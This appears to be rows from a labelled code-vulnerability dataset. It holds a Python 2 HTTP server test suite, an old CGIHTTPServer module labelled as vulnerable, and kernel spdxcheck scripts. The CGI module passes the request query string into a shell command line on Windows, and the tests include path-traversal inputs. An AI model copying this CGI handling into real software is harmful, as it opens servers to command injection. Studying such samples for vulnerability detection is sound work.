        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
5,5,923ba361d8f757f0656cfd216525aca4848e02aa,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
30,30,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""deprecated"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
            if id not in self.spdx.exceptions:
                raise ParserException(tok, 'Invalid Exception ID')
            if self.lastid not in self.spdx.exceptions[id]:
                raise ParserException(tok, 'Exception not valid for license %s' %self.lastid)
            self.lastid = None
        elif tok.type != 'WITH':
            self.lastid = None

    # Lexer functions
    def t_RPAR(self, tok):
        r'\)'
        self.lasttok = tok.type
        return tok

    def t_LPAR(self, tok):
        r'\('
        self.lasttok = tok.type
        return tok

    def t_ID(self, tok):
        r'[A-Za-z.0-9\-+]+'

        if self.lasttok == 'EXC':
            print(tok)
            raise ParserException(tok, 'Missing parentheses')

        tok.value = tok.value.strip()
        val = tok.value.upper()

        if val in self.reserved:
            tok.type = val
        elif self.lasttok == 'WITH':
            tok.type = 'EXC'

        self.lasttok = tok.type
        self.validate(tok)
        return tok

    def t_error(self, tok):
        raise ParserException(tok, 'Invalid token')

    def p_expr(self, p):
        '''expr : ID
                | ID WITH EXC
                | expr AND expr
                | expr OR expr
                | LPAR expr RPAR'''
        pass

    def p_error(self, p):
        if not p:
            raise ParserException(None, 'Unfinished license expression')
        else:
            raise ParserException(p, 'Syntax error')

    def parse(self, expr):
        self.lasttok = None
        self.lastid = None
        self.parser.parse(expr, lexer = self.lexer)

    def parse_lines(self, fd, maxlines, fname):
        self.checked += 1
        self.curline = 0
        try:
            for line in fd:
                line = line.decode(locale.getpreferredencoding(False), errors='ignore')
                self.curline += 1
                if self.curline > maxlines:
                    break
                self.lines_checked += 1
                if line.find(""SPDX-License-Identifier:"") < 0:
                    continue
                expr = line.split(':')[1].strip()
                # Remove trailing comment closure
                if line.strip().endswith('*/'):
                    expr = expr.rstrip('*/').strip()
                # Special case for SH magic boot code files
                if line.startswith('LIST \""'):
                    expr = expr.rstrip('\""').strip()
                self.parse(expr)
                self.spdx_valid += 1
                #
                # Should we check for more SPDX ids in the same file and
                # complain if there are any?
                #
                break

        except ParserException as pe:
            if pe.tok:
                col = line.find(expr) + pe.tok.lexpos
                tok = pe.tok.value
                sys.stdout.write('%s: %d:%d %s: %s\n' %(fname, self.curline, col, pe.txt, tok))
            else:
                sys.stdout.write('%s: %d:0 %s\n' %(fname, self.curline, col, pe.txt))
            self.spdx_errors += 1

def scan_git_tree(tree):
    for el in tree.traverse():
        # Exclude stuff which would make pointless noise
        # FIXME: Put this somewhere more sensible
        if el.path.startswith(""LICENSES""):
            continue
        if el.path.find(""license-rules.rst"") >= 0:
            continue
        if not os.path.isfile(el.path):
            continue
        with open(el.path, 'rb') as fd:
            parser.parse_lines(fd, args.maxlines, el.path)

def scan_git_subtree(tree, path):
    for p in path.strip('/').split('/'):
        tree = tree[p]
    scan_git_tree(tree)

if __name__ == '__main__':

    ap = ArgumentParser(description='SPDX expression checker')
    ap.add_argument('path', nargs='*', help='Check path or file. If not given full git tree scan. For stdin use ""-""')
    ap.add_argument('-m', '--maxlines', type=int, default=15,
                    help='Maximum number of lines to scan in a file. Default 15')
    ap.add_argument('-v', '--verbose', action='store_true', help='Verbose statistics output')
    args = ap.parse_args()

    # Sanity check path arguments
    if '-' in args.path and len(args.path) > 1:
        sys.stderr.write('stdin input ""-"" must be the only path argument\n')
        sys.exit(1)

    try:
        # Use git to get the valid license expressions
        repo = git.Repo(os.getcwd())
        assert not repo.bare

        # Initialize SPDX data
        spdx = read_spdxdata(repo)

        # Initilize the parser
        parser = id_parser(spdx)

    except SPDXException as se:
        if se.el:
            sys.stderr.write('%s: %s\n' %(se.el.path, se.txt))
        else:
            sys.stderr.write('%s\n' %se.txt)
        sys.exit(1)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)

    try:
        if len(args.path) and args.path[0] == '-':
            stdin = os.fdopen(sys.stdin.fileno(), 'rb')
            parser.parse_lines(stdin, args.maxlines, '-')
        else:
            if args.path:
                for p in args.path:
                    if os.path.isfile(p):
                        parser.parse_lines(open(p, 'rb'), args.maxlines, p)
                    elif os.path.isdir(p):
                        scan_git_subtree(repo.head.reference.commit.tree, p)
                    else:
                        sys.stderr.write('path %s does not exist\n' %p)
                        sys.exit(1)
            else:
                # Full git tree scan
                scan_git_tree(repo.head.commit.tree)

            if args.verbose:
                sys.stderr.write('\n')
                sys.stderr.write('License files:     %12d\n' %spdx.license_files)
                sys.stderr.write('Exception files:   %12d\n' %spdx.exception_files)
                sys.stderr.write('License IDs        %12d\n' %len(spdx.licenses))
                sys.stderr.write('Exception IDs      %12d\n' %len(spdx.exceptions))
                sys.stderr.write('\n')
                sys.stderr.write('Files checked:     %12d\n' %parser.checked)
                sys.stderr.write('Lines checked:     %12d\n' %parser.lines_checked)
                sys.stderr.write('Files with SPDX:   %12d\n' %parser.spdx_valid)
                sys.stderr.write('Files with errors: %12d\n' %parser.spdx_errors)

            sys.exit(0)

    except Exception as ex:
        sys.stderr.write('FAIL: %s\n' %ex)
        sys.stderr.write('%s\n' %traceback.format_exc())
        sys.exit(1)
/n/n/n",0
31,31,e6d319f68d4dcf355e89a7b21368c47c004a14c2,"/scripts/spdxcheck.py/n/n#!/usr/bin/env python
# SPDX-License-Identifier: GPL-2.0
# Copyright Thomas Gleixner <tglx@linutronix.de>

from argparse import ArgumentParser
from ply import lex, yacc
import locale
import traceback
import sys
import git
import re
import os

class ParserException(Exception):
    def __init__(self, tok, txt):
        self.tok = tok
        self.txt = txt

class SPDXException(Exception):
    def __init__(self, el, txt):
        self.el = el
        self.txt = txt

class SPDXdata(object):
    def __init__(self):
        self.license_files = 0
        self.exception_files = 0
        self.licenses = [ ]
        self.exceptions = { }

# Read the spdx data from the LICENSES directory
def read_spdxdata(repo):

    # The subdirectories of LICENSES in the kernel source
    license_dirs = [ ""preferred"", ""other"", ""exceptions"" ]
    lictree = repo.head.commit.tree['LICENSES']

    spdx = SPDXdata()

    for d in license_dirs:
        for el in lictree[d].traverse():
            if not os.path.isfile(el.path):
                continue

            exception = None
            for l in open(el.path).readlines():
                if l.startswith('Valid-License-Identifier:'):
                    lid = l.split(':')[1].strip().upper()
                    if lid in spdx.licenses:
                        raise SPDXException(el, 'Duplicate License Identifier: %s' %lid)
                    else:
                        spdx.licenses.append(lid)

                elif l.startswith('SPDX-Exception-Identifier:'):
                    exception = l.split(':')[1].strip().upper()
                    spdx.exceptions[exception] = []

                elif l.startswith('SPDX-Licenses:'):
                    for lic in l.split(':')[1].upper().strip().replace(' ', '').replace('\t', '').split(','):
                        if not lic in spdx.licenses:
                            raise SPDXException(None, 'Exception %s missing license %s' %(ex, lic))
                        spdx.exceptions[exception].append(lic)

                elif l.startswith(""License-Text:""):
                    if exception:
                        if not len(spdx.exceptions[exception]):
                            raise SPDXException(el, 'Exception %s is missing SPDX-Licenses' %excid)
                        spdx.exception_files += 1
                    else:
                        spdx.license_files += 1
                    break
    return spdx

class id_parser(object):

    reserved = [ 'AND', 'OR', 'WITH' ]
    tokens = [ 'LPAR', 'RPAR', 'ID', 'EXC' ] + reserved

    precedence = ( ('nonassoc', 'AND', 'OR'), )

    t_ignore = ' \t'

    def __init__(self, spdx):
        self.spdx = spdx
        self.lasttok = None
        self.lastid = None
        self.lexer = lex.lex(module = self, reflags = re.UNICODE)
        # Initialize the parser. No debug file and no parser rules stored on disk
        # The rules are small enough to be generated on the fly
        self.parser = yacc.yacc(module = self, write_tables = False, debug = False)
        self.lines_checked = 0
        self.checked = 0
        self.spdx_valid = 0
        self.spdx_errors = 0
        self.curline = 0
        self.deepest = 0

    # Validate License and Exception IDs
    def validate(self, tok):
        id = tok.value.upper()
        if tok.type == 'ID':
            if not id in self.spdx.licenses:
                raise ParserException(tok, 'Invalid License ID')
            self.lastid = id
        elif tok.type == 'EXC':
